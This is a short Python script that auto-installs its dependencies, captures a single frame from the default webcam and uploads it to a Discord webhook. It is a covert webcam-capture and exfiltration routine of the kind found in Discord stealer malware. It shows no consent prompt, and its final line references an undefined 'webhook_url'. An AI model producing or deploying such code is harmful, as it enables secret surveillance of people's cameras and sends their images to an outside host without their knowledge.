import subprocess
import sys
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import cv2
except ImportError:
    install('opencv-python')
    import cv2
try:
    import requests
except ImportError:
    install('requests')
    import requests
try:
    from io import BytesIO
except ImportError:
    install('io')
    from io import BytesIO
try:
    from PIL import Image
except ImportError:
    install('Pillow')
    from PIL import Image
def capture_and_send_to_discord(webhook_url):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not open webcam")
        return
    ret, frame = cap.read()
    if ret:
        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        image = Image.fromarray(rgb_frame)
        img_byte_arr = BytesIO()
        image.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        files = {
            'file': ('webcam.png', img_byte_arr, 'image/png')
        }
        try:
            response = requests.post(webhook_url, files=files)
            if response.status_code == 200:
                print("Image successfully sent to Discord")
            else:
                print(f"Failed to send image. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending image: {str(e)}")
    cap.release()
capture_and_send_to_discord(webhook_url)
